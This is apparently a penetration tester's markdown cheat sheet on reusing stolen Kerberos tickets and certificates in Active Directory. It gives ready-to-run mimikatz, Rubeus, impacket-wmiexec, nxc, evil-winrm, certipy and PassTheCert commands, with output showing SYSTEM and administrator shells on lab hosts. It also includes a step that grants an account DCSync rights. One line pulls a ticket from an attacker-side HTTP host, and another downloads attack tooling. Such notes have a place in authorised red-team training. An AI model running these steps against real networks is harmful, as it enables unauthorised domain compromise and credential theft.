# Cred Usage

## Misc

### convert ccache to kirbi

```bash
# convert ticket to kirbi for Rubeus or mimikatz
impacket-ticketConverter Administrator.ccache Administrator.kirbi

# then download the ticket on windows
wget -outfile Administrator.kirbi -uri http://192.168.68.10:9595/Administrator.kirbi -usebasicparsing

# ensure all low-priv tickets are removed 
klist purge

# then import the ticket on windows
# use either this
mimikatz "kerberos::ptt Administrator.kirbi" exit
# or this
Rubeus.exe ptt /ticket:Administrator.kirbi

# ensure it's imported
klist
```

## Pass-the-Cache

### General

```bash
### just place the TGS ccache file into KRB5CCNAME environment variable

la Administrator@HOST_WIN-NUU0DPB1BVC@CONTOSO.ORG.ccache
# -rw-rw-r-- 1 kali kali ? 1.6K Oct 19 15:11 Administrator@HOST_WIN-NUU0DPB1BVC@CONTOSO.ORG.ccache

export KRB5CCNAME='Administrator@HOST_WIN-NUU0DPB1BVC@CONTOSO.ORG.ccache'

klist
# Ticket cache: FILE:Administrator@HOST_WIN-NUU0DPB1BVC@CONTOSO.ORG.ccache
# Default principal: Administrator@contoso.org
```

### SMB

```bash
export KRB5CCNAME='Administrator@CIFS_win-srv01.sales.contoso.lab@SALES.CONTOSO.LAB.ccache'

nxc smb win-srv01.sales.contoso.lab -u Administrator -k --use-kcache
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-SRV01) (domain:sales.contoso.lab) (signing:False) (SMBv1:True)
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] sales.contoso.lab\Administrator from ccache (Pwn3d!)

nxc smb win-srv01.sales.contoso.lab -u Administrator -k --use-kcache --exec-method smbexec -x 'whoami /all'
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-SRV01) (domain:sales.contoso.lab) (signing:False) (SMBv1:True)
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] sales.contoso.lab\Administrator from ccache (Pwn3d!)
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] Executed command via smbexec
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        USER INFORMATION
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        ----------------
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        User Name           SID
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        =================== ========
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        nt authority\system S-1-5-18

```

### WMI

```bash
export KRB5CCNAME=Administrator.ccache && klist && impacket-wmiexec -debug -k -no-pass contoso.org/Administrator@WIN-KML6TP4LOOL
# Valid starting     Expires            Service principal
# 02/20/25 02:30:16  02/18/35 02:30:16  CIFS/WIN-KML6TP4LOOL@CONTOSO.ORG
# renew until 02/18/35 02:30:16
# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
#
# [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
# [+] Using Kerberos Cache: Administrator.ccache
# [+] Returning cached credential for CIFS/WIN-KML6TP4LOOL@CONTOSO.ORG
# [+] Using TGS from cache
# [*] SMBv3.0 dialect used
# [+] Using Kerberos Cache: Administrator.ccache
# [+] SPN HOST/WIN-KML6TP4LOOL@CONTOSO.ORG not found in cache
# [+] AnySPN is True, looking for another suitable SPN
# [+] Returning cached credential for CIFS/WIN-KML6TP4LOOL@CONTOSO.ORG
# [+] Using TGS from cache
# [+] Changing sname from CIFS/WIN-KML6TP4LOOL@CONTOSO.ORG to HOST/WIN-KML6TP4LOOL@CONTOSO.ORG and hoping for the best
# [+] Target system is WIN-KML6TP4LOOL and isFQDN is True
# [+] StringBinding: \\\\WIN-KML6TP4LOOL[\\PIPE\\atsvc]
# [+] StringBinding: WIN-KML6TP4LOOL[49665]
# [+] StringBinding chosen: ncacn_ip_tcp:WIN-KML6TP4LOOL[49665]
# [+] Using Kerberos Cache: Administrator.ccache
# [+] SPN HOST/WIN-KML6TP4LOOL@CONTOSO.ORG not found in cache
# [+] AnySPN is True, looking for another suitable SPN
# [+] Returning cached credential for CIFS/WIN-KML6TP4LOOL@CONTOSO.ORG
# [+] Using TGS from cache
# [+] Changing sname from CIFS/WIN-KML6TP4LOOL@CONTOSO.ORG to HOST/WIN-KML6TP4LOOL@CONTOSO.ORG and hoping for the best
# [+] Using Kerberos Cache: Administrator.ccache
# [+] SPN HOST/WIN-KML6TP4LOOL@CONTOSO.ORG not found in cache
# [+] AnySPN is True, looking for another suitable SPN
# [+] Returning cached credential for CIFS/WIN-KML6TP4LOOL@CONTOSO.ORG
# [+] Using TGS from cache
# [+] Changing sname from CIFS/WIN-KML6TP4LOOL@CONTOSO.ORG to HOST/WIN-KML6TP4LOOL@CONTOSO.ORG and hoping for the best
# [+] Using Kerberos Cache: Administrator.ccache
# [+] SPN HOST/WIN-KML6TP4LOOL@CONTOSO.ORG not found in cache
# [+] AnySPN is True, looking for another suitable SPN
# [+] Returning cached credential for CIFS/WIN-KML6TP4LOOL@CONTOSO.ORG
# [+] Using TGS from cache
# [+] Changing sname from CIFS/WIN-KML6TP4LOOL@CONTOSO.ORG to HOST/WIN-KML6TP4LOOL@CONTOSO.ORG and hoping for the best
# [!] Launching semi-interactive shell - Careful what you execute
# [!] Press help for extra shell commands
C:\>whoami
# contoso.org\administrator
C:\>
```

### WinRM

```bash
# add a realm to krb5.conf (note the capitalization)
cat /etc/krb5.conf | grep -A1 realms
# [realms]
#      CONTOSO.ORG = { kdc = WIN-KML6TP4LOOL.contoso.org }

# MAKE SURE -i INCLUDES FQDN AND THAT IT IS RESOLVABLE
# make sure the SPN is HTTP/...
export KRB5CCNAME=Administrator.ccache && evil-winrm -i WIN-KML6TP4LOOL.contoso.org -r contoso.org

# IF SPN is WSMAN or HOST or ANY other - specify it in --spn parameter
evil-winrm -i WIN-KML6TP4LOOL.contoso.org -r contoso.org --spn WSMAN
```

## Pass-the-Cert

### WMI

```bash
### PKINIT is enabled
# use a pfx file with certipy-ad
certipy-ad auth -pfx ./WIN-KML6TP4LOOL\$.pfx -dc-ip 192.168.68.64 -domain contoso.org


### PKINIT is disabled
# if you get the following error that means DC's KDC certificate doesn't support PKINIT (because DC's certificate doesn't have "KDC Authentication" EKU)
# KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)
# in order to resolve it do the following:
# the pfx format contains a private key and the cert. extract them.
certipy cert -pfx administrator_forged.pfx -nokey -out administrator.crt
certipy cert -pfx administrator.pfx -nocert -out administrator.key
# download and use "passthecert" utility
wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py
# even when PKINIT is not supported, we can still authenticate on a DC using mTLS - this is what PassTheCert.py does. Unfortunately, if an account you coerced and got the cert to doesn't have necessary LDAP outbound rights (e.g. it's a domain controller computer account which cannot do anything, apart from RPC DCSync - you cannot do anything with it)

# If you get something similar to "User not found in LDAP" that probably means the DC you have the cert for is not domain-joined
# now you can grant yourself DCSync privs, modify user's password or change DC's msDS-AllowedToActOnBehalfOfOtherIdentity for RBAC
# This (modify_user + -elevate) will grant the user account DCSync privileges
python3 ./passthecert.py -action modify_user -crt administrator.crt -key administrator.key -target kelly.hill -elevate -domain push.vl -dc-host dc01.push.vl
```
